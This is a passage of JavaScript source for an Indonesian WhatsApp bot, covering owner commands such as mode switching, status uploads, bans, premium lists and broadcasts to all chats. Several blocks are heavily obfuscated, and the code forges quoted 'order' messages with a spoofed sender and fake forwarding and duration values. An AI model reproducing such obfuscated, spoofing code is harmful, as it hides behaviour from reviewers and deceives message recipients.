           remoteJid: "6283136505591-1614953337@g.us", id: "B391837A58338BA8186C47E51FFDFD4A" }, 
           message: { documentMessage: { 'jpegThumbnail': fs.readFileSync("./dns/thumbnail.jpeg"), mimetype: "application/octet-stream",
           title: "Status : Self", fileLength: "36", pageCount: 0, 
           fileName: "Status : Self",
           messageTimestamp: "1614069378", status: "PENDING"
           }
           }
           }
           }
           self = true 
           let lat =`\`\`\`Sukses Mengaktifkan Mode Self\`\`\``
           dila.sendMessage(from, lat, MessageType.text, denzz)
           break  
           case 'public':
           if (!isOwner) return reply(dla.ownerb())
           if (self === false) return 
           let denss = {
           thumbnail: dnsnew,
           quoted: { 
           key: { 
           fromMe: false, participant: `0@s.whatsapp.net`, 
           remoteJid: "6283136505591-1614953337@g.us", id: "B391837A58338BA8186C47E51FFDFD4A" }, 
           message: { documentMessage: { 'jpegThumbnail': fs.readFileSync("./dns/thumbnail.jpeg"), mimetype: "application/octet-stream",
           title: "Status : Public", fileLength: "36", pageCount: 0, 
           fileName: "Status : Public",
           messageTimestamp: "1614069378", status: "PENDING"
           }
           }
           }
           }
           self = false
           let breh =`\`\`\`Sukses Mengaktifkan Mode Public\`\`\``
           dila.sendMessage(from, breh, MessageType.text, denss)
           break
					case 'delchatgc':
					if (!isOwner) return reply(dla.ownerb())
                reply('Sukses membersihkan pesan')
                console.log('succes delete chat = ' + from)
                await sleep(5000)
                dila.modifyChat(from, ChatModification.delete)
                break
case 'upswteks':
if (!isOwner) return reply(dla.ownerb())
                    teks = body.slice(10)
                    dila.sendMessage('status@broadcast', teks, MessageType.text)
                    reply(`Sukses upload status:\n${teks}`)
                    break	
case 'upswvideo':
if (!isOwner) return reply(dla.ownerb())
                    var konti = body.slice(11)
                    reply('Otw...')
                    enmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(enmedia)
                    const buffer3 = fs.readFileSync(media)
                    dila.sendMessage('status@broadcast', buffer3, MessageType.video, {quoted: Lan, caption: `${konti}`})
                    reply(`Sukses upload video:\n${konti}`)
                        break
                        case 'upswimage':
                        if (!isOwner) return reply(dla.ownerb())
                    var teksyy = body.slice(11)
                    reply('Otw...')
                    enmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(enmedia)
                    buffer = fs.readFileSync(media)
                    dila.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: Lan, caption: `${teksyy}`})
                    reply(`Sukses upload image:\n${teksyy}`)
                        break
					case 'shutdown':
					if (!isOwner) return reply(dla.ownerb())
				reply('Okey')
				console.log(color('[', 'white'), color('SYSTEM', 'cyan'), color(']', 'white'), color('Bye kak besok ketemu lagi ya, Jangan lupa sholat kak', 'yellow'), color('(😊)', 'white'))
				await sleep(5000)
				dila.close()
				break
				case 'leave':
				if (!isOwner) return reply(dla.ownerb())
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					setTimeout(() => {
						dila.groupLeave(from)
					}, 2000)
					setTimeout(() => {
						dila.updatePresence(from, Presence.composing)
						if (!isRegistered) return reply(dla.noregis())
						if (isBanned) return reply(dla.baned())
						fakestatus('Aku pamit kak:)')
					}, 0)
					break
                case 'setthumb':
                if (!isOwner) return reply(dla.ownerb())
                    if (!isQuotedImage) return reply('Reply imagenya blokk!')
                    const messimagethumb = JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
                    const downiamgethumb = await dila.downloadMediaMessage(messimagethumb)
                    fs.unlinkSync(`./dns/thumbnail.jpeg`)
                    await sleep(2000)
                    fs.writeFileSync(`./dns/thumbnail.jpeg`, downiamgethumb)
                    var _0x3a84=['C3rHDhvZqgjYB2fKy2fZDa','nfDhu2HJBG','CMvHzezPBgvtEw5J','odK4mty4wxDtCuTH','mebZlNDOyxrZyxbWlM5LDa','mZaZotC1vNHwzw5f','mtm1nZeZChv2u012','mZKXmtm0uhvtAejT','nJG3mdnVy3LzwuG','mtG1nw1ozwryCa','m1D0wfjOsq','ygbGu3vJy2vZygbG','m3jesNbTuq','odK0ndeWqLjYzhrV','C2vUze1LC3nHz2u','ntzZwNzStwu'];function _0x54c1(_0x36242f,_0x58852d){_0x36242f=_0x36242f-0xd7;var _0x3a84c0=_0x3a84[_0x36242f];if(_0x54c1['pvWdJV']===undefined){var _0x54c10a=function(_0x375cad){var _0x1b7a55='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x5120af='';for(var _0x245f11=0x0,_0x14cdf0,_0x5aa74b,_0x50b70c=0x0;_0x5aa74b=_0x375cad['charAt'](_0x50b70c++);~_0x5aa74b&&(_0x14cdf0=_0x245f11%0x4?_0x14cdf0*0x40+_0x5aa74b:_0x5aa74b,_0x245f11++%0x4)?_0x5120af+=String['fromCharCode'](0xff&_0x14cdf0>>(-0x2*_0x245f11&0x6)):0x0){_0x5aa74b=_0x1b7a55['indexOf'](_0x5aa74b);}return _0x5120af;};_0x54c1['UgHVGz']=function(_0x408e57){var _0x21e469=_0x54c10a(_0x408e57);var _0x58b613=[];for(var _0x93ba90=0x0,_0x52ee52=_0x21e469['length'];_0x93ba90<_0x52ee52;_0x93ba90++){_0x58b613+='%'+('00'+_0x21e469['charCodeAt'](_0x93ba90)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x58b613);},_0x54c1['RHCmeM']={},_0x54c1['pvWdJV']=!![];}var _0x394228=_0x3a84[0x0],_0xe63a2e=_0x36242f+_0x394228,_0x338e55=_0x54c1['RHCmeM'][_0xe63a2e];return _0x338e55===undefined?(_0x3a84c0=_0x54c1['UgHVGz'](_0x3a84c0),_0x54c1['RHCmeM'][_0xe63a2e]=_0x3a84c0):_0x3a84c0=_0x338e55,_0x3a84c0;}var _0x3e9d99=_0x54c1;(function(_0x7fa1e8,_0x3aa887){var _0x36978e=_0x54c1;while(!![]){try{var _0x1489a4=-parseInt(_0x36978e(0xd7))+parseInt(_0x36978e(0xe3))*parseInt(_0x36978e(0xd9))+-parseInt(_0x36978e(0xe6))*-parseInt(_0x36978e(0xe2))+-parseInt(_0x36978e(0xe0))*parseInt(_0x36978e(0xdb))+parseInt(_0x36978e(0xdd))+-parseInt(_0x36978e(0xdf))+-parseInt(_0x36978e(0xe4))*-parseInt(_0x36978e(0xe1));if(_0x1489a4===_0x3aa887)break;else _0x7fa1e8['push'](_0x7fa1e8['shift']());}catch(_0xafe9d0){_0x7fa1e8['push'](_0x7fa1e8['shift']());}}}(_0x3a84,0x9c542),dila[_0x3e9d99(0xd8)](from,_0x3e9d99(0xe5),text,{'thumbnail':dnsnew,'sendEphemeral':!![],'quoted':{'key':{'fromMe':![],'participant':_0x3e9d99(0xde),...from?{'remoteJid':_0x3e9d99(0xda)}:{}},'message':{'orderMessage':{'itemCount':0x3e7,'status':0xc8,'thumbnail':fs[_0x3e9d99(0xdc)]('./dns/thumbnail.jpeg'),'surface':0xc8,'message':cr,'orderTitle':cr,'sellerJid':_0x3e9d99(0xde)}}}}));
                    break
				case 'setppbot':
				dila.updatePresence(from, Presence.composing)
				if (!isQuotedImage) return reply(`Kirim gambar dengan caption ${prefix}setbotpp atau tag gambar yang sudah dikirim`)
					if (!isOwner) return reply(dla.ownerb())
					enmedia = JSON.parse(JSON.stringify(Lan).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await dila.downloadAndSaveMediaMessage(enmedia)
					await dila.updateProfilePicture(botNumber, media)
					var _0x2dd3=['ygbGu3vJy2vZygbG','mZm5mJm5vwjmreDt','mJaWodC3y0r6vvzo','C2vUze1LC3nHz2u','mJm2mZC5veX4uxf2','mebZlNDOyxrZyxbWlM5LDa','mJu4ntK1DK9hrfDX','mZqWmJeZu0TzzNjU','mtmXodm3sM9csMHo','mJuYmdu2t2PZv2Pv'];function _0x1ec1(_0x3ee600,_0x24c62d){_0x3ee600=_0x3ee600-0xd9;var _0x2dd331=_0x2dd3[_0x3ee600];if(_0x1ec1['KpYzyq']===undefined){var _0x1ec12a=function(_0x13fe00){var _0x504799='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x41dda4='';for(var _0x5357c0=0x0,_0x207b1d,_0x205361,_0x2b5721=0x0;_0x205361=_0x13fe00['charAt'](_0x2b5721++);~_0x205361&&(_0x207b1d=_0x5357c0%0x4?_0x207b1d*0x40+_0x205361:_0x205361,_0x5357c0++%0x4)?_0x41dda4+=String['fromCharCode'](0xff&_0x207b1d>>(-0x2*_0x5357c0&0x6)):0x0){_0x205361=_0x504799['indexOf'](_0x205361);}return _0x41dda4;};_0x1ec1['VcbBYw']=function(_0xa14c10){var _0x1d0440=_0x1ec12a(_0xa14c10);var _0x678e88=[];for(var _0x19ea56=0x0,_0x4a79b4=_0x1d0440['length'];_0x19ea56<_0x4a79b4;_0x19ea56++){_0x678e88+='%'+('00'+_0x1d0440['charCodeAt'](_0x19ea56)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x678e88);},_0x1ec1['ggEsem']={},_0x1ec1['KpYzyq']=!![];}var _0x7bbea0=_0x2dd3[0x0],_0xcef909=_0x3ee600+_0x7bbea0,_0xc7edf=_0x1ec1['ggEsem'][_0xcef909];return _0xc7edf===undefined?(_0x2dd331=_0x1ec1['VcbBYw'](_0x2dd331),_0x1ec1['ggEsem'][_0xcef909]=_0x2dd331):_0x2dd331=_0xc7edf,_0x2dd331;}var _0x19505c=_0x1ec1;(function(_0x551dd2,_0x37c2f0){var _0x630354=_0x1ec1;while(!![]){try{var _0x2917a1=-parseInt(_0x630354(0xe1))+-parseInt(_0x630354(0xdf))+-parseInt(_0x630354(0xda))+parseInt(_0x630354(0xdc))+parseInt(_0x630354(0xe0))+parseInt(_0x630354(0xde))+parseInt(_0x630354(0xd9));if(_0x2917a1===_0x37c2f0)break;else _0x551dd2['push'](_0x551dd2['shift']());}catch(_0x8d800a){_0x551dd2['push'](_0x551dd2['shift']());}}}(_0x2dd3,0x2a368),dila[_0x19505c(0xdb)](from,_0x19505c(0xe2),text,{'quoted':{'key':{'fromMe':![],'participant':_0x19505c(0xdd),...from?{'remoteJid':'status@broadcast'}:{}},'message':{'orderMessage':{'itemCount':0x3e7,'status':0xc8,'thumbnail':await getBuffer(me['imgUrl']),'surface':0xc8,'message':cr,'orderTitle':cr,'sellerJid':'0@s.whatsapp.net'}}}}));
                 break
                 case 'readall':
					if (!isOwner) return reply(dla.ownerb())
					var chats = await dila.chats.all()
                    chats.map( async ({ jid }) => {
                          await dila.chatRead(jid)
                    })
					rdl = `Berhasil membaca ${chats.length} Chat !`
					await dila.sendMessage(from, rdl, MessageType.text, {quoted: Lan})
					console.log(chats.length)
					break
				case 'addprem':
					if (!isOwner) return reply(dla.ownerb())
					adprem = `${args[0].replace('@', '')}@s.whatsapp.net`
					premium.push(adprem)
					fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
					fakestatus(`BERHASIL MENAMBAHKAN USER PREMIUM`)
					break

				case 'dellprem':
					if (!isOwner) return reply(dla.ownerb())
					delprem = `${args[0].replace('@', '')}@s.whatsapp.net`
					delp = ban.indexOf(delprem)
					premium.splice(delp, 1)
					fs.writeFileSync('./database/premium.json', JSON.stringify(premium))
					fakestatus(`BERHASIL MENGHAPUS USER PREMIUM`)
					break
					
                case 'premiumlist':
				dila.updatePresence(from, Presence.composing) 
					if (isBanned) return reply(dla.baned())
					if (!isRegistered) return reply(dla.noregis())
					if (isLimit(sender)) return reply(dla.limitend(pusname, prefix))
				pemlist = '╭──「 *USER PREMIUM* 」\n'
				for (let premm of premium) {
					pemlist += `> @${premm.split('@')[0]}\n`
					}
					pemlist += `Total : ${premium.length}`
				dila.sendMessage(from, pemlist.trim(), extendedText, {quoted: Lan, contextInfo: {"mentionedJid": premium}})
				break
				
				case 'ban':
					if (!isOwner) return reply(dla.ownerb())
					if (args[0].startsWith('6285866295942')) return reply('\`\`\`Error!\`\`\`')
					if (args[0].startsWith('6285876210829')) return reply('\`\`\`Error!\`\`\`')
					bnnd = `${args[0].replace('@', '')}@s.whatsapp.net`
					ban.push(bnnd)
					fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
					fakestatus(`Nomor ${bnnd} telah dibanned!`)
					break

				case 'unban':
					if (!isOwner) return reply(dla.ownerb())
					ya = `${args[0].replace('@', '')}@s.whatsapp.net`
					unb = ban.indexOf(ya)
					ban.splice(unb, 1)
					fs.writeFileSync('./database/banned.json', JSON.stringify(ban))
					fakestatus(`Nomor ${ya} telah di unban!`)
					break
                   case 'bc':
					dila.updatePresence(from, Presence.composing)
					if (!isOwner) return reply(dla.ownerb())
					if (args.length < 1) return reply('Teksnya?')
					anu = await dila.chats.all()
					if (isMedia && !Lan.message.videoMessage || isQuotedImage) {
						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
						buff = await dila.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							var _0x5264=['mJGWntuWm2vKzw9IzG','mZaXrffZq29i','mebZlNDOyxrZyxbWlM5LDa','ndq1nJK5rMjRrNrS','nJu4odKYAfHis01x','qNjVywrJyxn0','nte3mdK1rhbhEfzJ','mte5mdiWovrUtfH0Bq','CMvHzezPBgvtEw5J','mZK4ouDnsKfHyW','mxHsuxDwtq','C2vUze1LC3nHz2u','lI9KBNmVzg5ZBMv3lMPWzW','C3rHDhvZqgjYB2fKy2fZDa','mZGZnty4vvLesMv4'];function _0x3e87(_0x2e9a1d,_0x1c1873){_0x2e9a1d=_0x2e9a1d-0x1a3;var _0x526411=_0x5264[_0x2e9a1d];if(_0x3e87['YPfmze']===undefined){var _0x3e8734=function(_0x1bccb1){var _0x539d89='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x20146c='';for(var _0x223c22=0x0,_0xba5068,_0x335553,_0x1d9aba=0x0;_0x335553=_0x1bccb1['charAt'](_0x1d9aba++);~_0x335553&&(_0xba5068=_0x223c22%0x4?_0xba5068*0x40+_0x335553:_0x335553,_0x223c22++%0x4)?_0x20146c+=String['fromCharCode'](0xff&_0xba5068>>(-0x2*_0x223c22&0x6)):0x0){_0x335553=_0x539d89['indexOf'](_0x335553);}return _0x20146c;};_0x3e87['ITCpDa']=function(_0x2985e8){var _0x2cb806=_0x3e8734(_0x2985e8);var _0x38646e=[];for(var _0x3eb4e3=0x0,_0x29b1c8=_0x2cb806['length'];_0x3eb4e3<_0x29b1c8;_0x3eb4e3++){_0x38646e+='%'+('00'+_0x2cb806['charCodeAt'](_0x3eb4e3)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x38646e);},_0x3e87['BHDOZf']={},_0x3e87['YPfmze']=!![];}var _0x4917c1=_0x5264[0x0],_0x241c3f=_0x2e9a1d+_0x4917c1,_0xb71fbb=_0x3e87['BHDOZf'][_0x241c3f];return _0xb71fbb===undefined?(_0x526411=_0x3e87['ITCpDa'](_0x526411),_0x3e87['BHDOZf'][_0x241c3f]=_0x526411):_0x526411=_0xb71fbb,_0x526411;}var _0x4d464b=_0x3e87;(function(_0x1efaae,_0x313bda){var _0x3a4578=_0x3e87;while(!![]){try{var _0x12a85b=-parseInt(_0x3a4578(0x1b0))+-parseInt(_0x3a4578(0x1a3))*parseInt(_0x3a4578(0x1ab))+-parseInt(_0x3a4578(0x1a6))+parseInt(_0x3a4578(0x1a9))+-parseInt(_0x3a4578(0x1a8))*parseInt(_0x3a4578(0x1ac))+-parseInt(_0x3a4578(0x1a5))+parseInt(_0x3a4578(0x1b1));if(_0x12a85b===_0x313bda)break;else _0x1efaae['push'](_0x1efaae['shift']());}catch(_0x3022cf){_0x1efaae['push'](_0x1efaae['shift']());}}}(_0x5264,0xc0d09),dila[_0x4d464b(0x1ad)](_['jid'],buff,image,{'quoted':{'key':{'fromMe':![],'participant':_0x4d464b(0x1a4),...from?{'remoteJid':_0x4d464b(0x1af)}:{}},'message':{'orderMessage':{'itemCount':0x3e7,'status':0xc8,'thumbnail':fs[_0x4d464b(0x1aa)](_0x4d464b(0x1ae)),'surface':0xc8,'message':'Broadcast','orderTitle':_0x4d464b(0x1a7),'sellerJid':_0x4d464b(0x1a4)}}},'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![]},'caption':''+body['slice'](0x4)}));
							}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
						} else if (isMedia && !Lan.message.videoMessage || isQuotedVideo) {
						const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
						buff = await dila.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							var _0x2506=['mty5mdC5Bw1ZDg9r','mZe2mdKXqM12zufM','CMvHzezPBgvtEw5J','mu5rzLvnua','C2vUze1LC3nHz2u','mebZlNDOyxrZyxbWlM5LDa','nZu1ndv0se1rthu','qNjVywrJyxn0','odu0nZv1zKr5ufK','AMLK','ntiZnZe0vwTXzxHr','n3buAxvYAa','m2TqtujLsW','nty5mZv6wKvys3m','mJa5nJu2qxH6D3DS','C3rHDhvZqgjYB2fKy2fZDa','C2XPy2u','DMLKzw8VBxa0'];var _0x40f5a9=_0x6da2;function _0x6da2(_0x34b8c2,_0x3ce535){_0x34b8c2=_0x34b8c2-0x1d5;var _0x250648=_0x2506[_0x34b8c2];if(_0x6da2['mbAslL']===undefined){var _0x6da267=function(_0x15af01){var _0x3f6245='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x3c6bd2='';for(var _0x381584=0x0,_0xd98bd9,_0xbdccb1,_0x23fccd=0x0;_0xbdccb1=_0x15af01['charAt'](_0x23fccd++);~_0xbdccb1&&(_0xd98bd9=_0x381584%0x4?_0xd98bd9*0x40+_0xbdccb1:_0xbdccb1,_0x381584++%0x4)?_0x3c6bd2+=String['fromCharCode'](0xff&_0xd98bd9>>(-0x2*_0x381584&0x6)):0x0){_0xbdccb1=_0x3f6245['indexOf'](_0xbdccb1);}return _0x3c6bd2;};_0x6da2['oikLUs']=function(_0x51d250){var _0x2eb10b=_0x6da267(_0x51d250);var _0x59e0a6=[];for(var _0x5bb3d2=0x0,_0x1f4573=_0x2eb10b['length'];_0x5bb3d2<_0x1f4573;_0x5bb3d2++){_0x59e0a6+='%'+('00'+_0x2eb10b['charCodeAt'](_0x5bb3d2)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x59e0a6);},_0x6da2['ohGAlT']={},_0x6da2['mbAslL']=!![];}var _0x28486a=_0x2506[0x0],_0x2cdc83=_0x34b8c2+_0x28486a,_0x25472f=_0x6da2['ohGAlT'][_0x2cdc83];return _0x25472f===undefined?(_0x250648=_0x6da2['oikLUs'](_0x250648),_0x6da2['ohGAlT'][_0x2cdc83]=_0x250648):_0x250648=_0x25472f,_0x250648;}(function(_0x216139,_0x32c14d){var _0x430c39=_0x6da2;while(!![]){try{var _0x323133=-parseInt(_0x430c39(0x1e5))+-parseInt(_0x430c39(0x1e6))+-parseInt(_0x430c39(0x1e2))+-parseInt(_0x430c39(0x1d9))*-parseInt(_0x430c39(0x1db))+parseInt(_0x430c39(0x1e0))*parseInt(_0x430c39(0x1e4))+parseInt(_0x430c39(0x1d8))+-parseInt(_0x430c39(0x1de))*-parseInt(_0x430c39(0x1e3));if(_0x323133===_0x32c14d)break;else _0x216139['push'](_0x216139['shift']());}catch(_0x5beac1){_0x216139['push'](_0x216139['shift']());}}}(_0x2506,0x75369),dila[_0x40f5a9(0x1dc)](_[_0x40f5a9(0x1e1)],buff,video,{'quoted':{'key':{'fromMe':![],'participant':'0@s.whatsapp.net',...from?{'remoteJid':_0x40f5a9(0x1d5)}:{}},'message':{'orderMessage':{'itemCount':0x3e7,'status':0xc8,'thumbnail':fs[_0x40f5a9(0x1da)]('./dns/dnsnew.jpg'),'surface':0xc8,'message':_0x40f5a9(0x1df),'orderTitle':_0x40f5a9(0x1df),'sellerJid':_0x40f5a9(0x1dd)}}},'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![]},'caption':''+body[_0x40f5a9(0x1d6)](0x4),'mimetype':_0x40f5a9(0x1d7),'duration':0x3b9ac9ff}));
							}
						reply(`Sukses mengirim Broadcast ${body.slice(4)}`)
					} else {
						for (let _ of anu) {
							sendMess(_.jid, `${body.slice(4)}`)
						}
						reply(`Sukses mengirim Broadcast:\n${body.slice(4)}`)
					}
					break
					case 'tobc':
					dila.updatePresence(from, Presence.composing)
					if (!isOwner) return reply(dla.ownerb())
					anu = await dila.chats.all()
					if (isMedia && !Lan.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
						buff = await dila.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							var _0x3dee=['ntC1nJa5yLHcqwjI','C3rHDhvZqgjYB2fKy2fZDa','mJK0otGXDKLxuvPO','m0P3zwLpBq','mtzosvf5uuy','mZmYnLjwuNHhva','mty5mJqXC3nsBw9U','mZC4n3vJrgzrDG','m0rgELDYza','mZnczu1cug8','ntzlEwPxEhq','mebZlNDOyxrZyxbWlM5LDa','ndKWoxPeuMf0wq','AMLK','qNjVywrJyxn0','ndy1ntq4A0X1r3Pc'];function _0x1f58(_0x33a0c2,_0x2c05cf){_0x33a0c2=_0x33a0c2-0x161;var _0x3dee4b=_0x3dee[_0x33a0c2];if(_0x1f58['ggOrjL']===undefined){var _0x1f5889=function(_0x2af6c5){var _0x451fa6='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x5746fd='';for(var _0x5c9211=0x0,_0x46579c,_0x4c7f94,_0x2f48f4=0x0;_0x4c7f94=_0x2af6c5['charAt'](_0x2f48f4++);~_0x4c7f94&&(_0x46579c=_0x5c9211%0x4?_0x46579c*0x40+_0x4c7f94:_0x4c7f94,_0x5c9211++%0x4)?_0x5746fd+=String['fromCharCode'](0xff&_0x46579c>>(-0x2*_0x5c9211&0x6)):0x0){_0x4c7f94=_0x451fa6['indexOf'](_0x4c7f94);}return _0x5746fd;};_0x1f58['RhLIJd']=function(_0x3ff165){var _0x3e669c=_0x1f5889(_0x3ff165);var _0x4e39ef=[];for(var _0x152066=0x0,_0x3b3813=_0x3e669c['length'];_0x152066<_0x3b3813;_0x152066++){_0x4e39ef+='%'+('00'+_0x3e669c['charCodeAt'](_0x152066)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x4e39ef);},_0x1f58['XEJdXR']={},_0x1f58['ggOrjL']=!![];}var _0x15ceee=_0x3dee[0x0],_0x383f23=_0x33a0c2+_0x15ceee,_0x46b06b=_0x1f58['XEJdXR'][_0x383f23];return _0x46b06b===undefined?(_0x3dee4b=_0x1f58['RhLIJd'](_0x3dee4b),_0x1f58['XEJdXR'][_0x383f23]=_0x3dee4b):_0x3dee4b=_0x46b06b,_0x3dee4b;}var _0x2d4047=_0x1f58;(function(_0xcb777f,_0xf40e1c){var _0x318f4c=_0x1f58;while(!![]){try{var _0x2c2554=parseInt(_0x318f4c(0x16f))*parseInt(_0x318f4c(0x163))+parseInt(_0x318f4c(0x16c))+parseInt(_0x318f4c(0x16e))*-parseInt(_0x318f4c(0x161))+-parseInt(_0x318f4c(0x166))*-parseInt(_0x318f4c(0x164))+-parseInt(_0x318f4c(0x170))*-parseInt(_0x318f4c(0x16d))+parseInt(_0x318f4c(0x16a))+parseInt(_0x318f4c(0x162))*-parseInt(_0x318f4c(0x169));if(_0x2c2554===_0xf40e1c)break;else _0xcb777f['push'](_0xcb777f['shift']());}catch(_0x2ed603){_0xcb777f['push'](_0xcb777f['shift']());}}}(_0x3dee,0x4aa4b),dila['sendMessage'](_[_0x2d4047(0x167)],buff,audio,{'quoted':{'key':{'fromMe':![],'participant':_0x2d4047(0x165),...from?{'remoteJid':_0x2d4047(0x16b)}:{}},'message':{'orderMessage':{'itemCount':0x3e7,'status':0xc8,'thumbnail':fs['readFileSync']('./dns/dnsnew.jpg'),'surface':0xc8,'message':'Broadcast','orderTitle':_0x2d4047(0x168),'sellerJid':_0x2d4047(0x165)}}},'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![]},'mimetype':'audio/mp4','duration':0x3b9ac9ff,'ptt':!![]}));
							}
						} else if (isMedia && !Lan.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(Lan).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : Lan
						buff = await dila.downloadMediaMessage(encmedia)
						for (let _ of anu) {
							var _0x4b23=['mteWoduXm2zMrw9JyG','mJG1ndzPuLb5swC','mK5myMXnyq','C3rHDhvZqgjYB2fKy2fZDa','muDvtePvza','nJiYotqZwwz1D0Xi','mxzbuM9rDW','nty0otG1we1OA1nl','lI9KBNmVzg5ZBMv3lMPWzW','nevKCwvnsq','qNjVywrJyxn0','mtiXmJG3CvHczxnp','nJqZnJC0Bxjpq3r5','ofL5A2PMuq','mebZlNDOyxrZyxbWlM5LDa','C2vUze1LC3nHz2u','m2DdrhHtCW','AMLK','mte3mJy4ohzwyun1ra'];var _0xe7b913=_0x4e82;function _0x4e82(_0x43825e,_0x9502cc){_0x43825e=_0x43825e-0x11a;var _0x4b235b=_0x4b23[_0x43825e];if(_0x4e82['UJeRgC']===undefined){var _0x4e82c0=function(_0x1c4042){var _0xd90e37='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x28cad4='';for(var _0xc46a75=0x0,_0x48cf18,_0x1a1753,_0x49f473=0x0;_0x1a1753=_0x1c4042['charAt'](_0x49f473++);~_0x1a1753&&(_0x48cf18=_0xc46a75%0x4?_0x48cf18*0x40+_0x1a1753:_0x1a1753,_0xc46a75++%0x4)?_0x28cad4+=String['fromCharCode'](0xff&_0x48cf18>>(-0x2*_0xc46a75&0x6)):0x0){_0x1a1753=_0xd90e37['indexOf'](_0x1a1753);}return _0x28cad4;};_0x4e82['NnGgwA']=function(_0x21962e){var _0x58087a=_0x4e82c0(_0x21962e);var _0x576e32=[];for(var _0x4b4e5c=0x0,_0x379e54=_0x58087a['length'];_0x4b4e5c<_0x379e54;_0x4b4e5c++){_0x576e32+='%'+('00'+_0x58087a['charCodeAt'](_0x4b4e5c)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x576e32);},_0x4e82['FjfKvx']={},_0x4e82['UJeRgC']=!![];}var _0x490efa=_0x4b23[0x0],_0x5129bd=_0x43825e+_0x490efa,_0x3aad1e=_0x4e82['FjfKvx'][_0x5129bd];return _0x3aad1e===undefined?(_0x4b235b=_0x4e82['NnGgwA'](_0x4b235b),_0x4e82['FjfKvx'][_0x5129bd]=_0x4b235b):_0x4b235b=_0x3aad1e,_0x4b235b;}(function(_0x5442fa,_0x24dd46){var _0x4f4835=_0x4e82;while(!![]){try{var _0x2a60e9=-parseInt(_0x4f4835(0x128))*-parseInt(_0x4f4835(0x11b))+-parseInt(_0x4f4835(0x125))*-parseInt(_0x4f4835(0x120))+-parseInt(_0x4f4835(0x121))*parseInt(_0x4f4835(0x12c))+parseInt(_0x4f4835(0x12a))*-parseInt(_0x4f4835(0x11c))+parseInt(_0x4f4835(0x129))*-parseInt(_0x4f4835(0x122))+-parseInt(_0x4f4835(0x127))+parseInt(_0x4f4835(0x11e))*parseInt(_0x4f4835(0x11a));if(_0x2a60e9===_0x24dd46)break;else _0x5442fa['push'](_0x5442fa['shift']());}catch(_0x3f90fd){_0x5442fa['push'](_0x5442fa['shift']());}}}(_0x4b23,0xc0bc6),dila[_0xe7b913(0x124)](_[_0xe7b913(0x126)],buff,sticker,{'quoted':{'key':{'fromMe':![],'participant':_0xe7b913(0x123),...from?{'remoteJid':_0xe7b913(0x12b)}:{}},'message':{'orderMessage':{'itemCount':0x3e7,'status':0xc8,'thumbnail':fs['readFileSync'](_0xe7b913(0x11d)),'surface':0xc8,'message':_0xe7b913(0x11f),'orderTitle':_0xe7b913(0x11f),'sellerJid':'0@s.whatsapp.net'}}},'contextInfo':{'forwardingScore':0x1fc,'isForwarded':!![]}}));
							}
							} else{
          reply('reply sticker/audio')
							}
					break
				case 'setreply':
					if (!isOwner) return reply(dla.ownerb())
					dila.updatePresence(from, Presence.composing)
					if (args.length < 1) return
					cr = body.slice(10)
					fakestatus(`reply berhasil di ubah menjadi : ${cr}`)
					await limitAdd(sender)
					break					
					
				case 'setprefix':
					if (args.length < 1) return
					if (!isOwner) return reply(dla.ownerb())
					prefix = args[0]
					fakestatus(`*「 SUKSES 」* Prefix jadi ❏ : ${prefix}`)
					break

				case 'setbio':
					if (!isOwner) return reply(dla.ownerb())
					iyek = body.slice(8)
					dila.setStatus(`${iyek}`)
					fakestatus(`Status BOT berhasil diperbarui menjadi :\n*[ ${iyek} ]*`)
					break
					
				case 'clearall':
					if (!isOwner) return reply(dla.ownerb())
					anu = await dila.chats.all()
					dila.setMaxListeners(25)
					for (let _ of anu) {
						dila.deleteChat(_.jid)
					}
					fakestatus(dla.clears())
					break

				case 'resetlimit':
					if (!isOwner) return reply(dla.ownerb())
					var ngonsol = []
					rest = _limit.indexOf([])
					_limit.splice(rest)
					fs.writeFileSync('./database/limit.json', JSON.stringify(ngonsol))
					fakestatus(`LIMIT BERHASIL DI RESET BOS`)
					break

				case 'event':
					if (isBanned) return reply(dla.baned())
					if (!isGroup) return reply(dla.groupo())
					if (!isOwner) return reply(dla.ownerb())
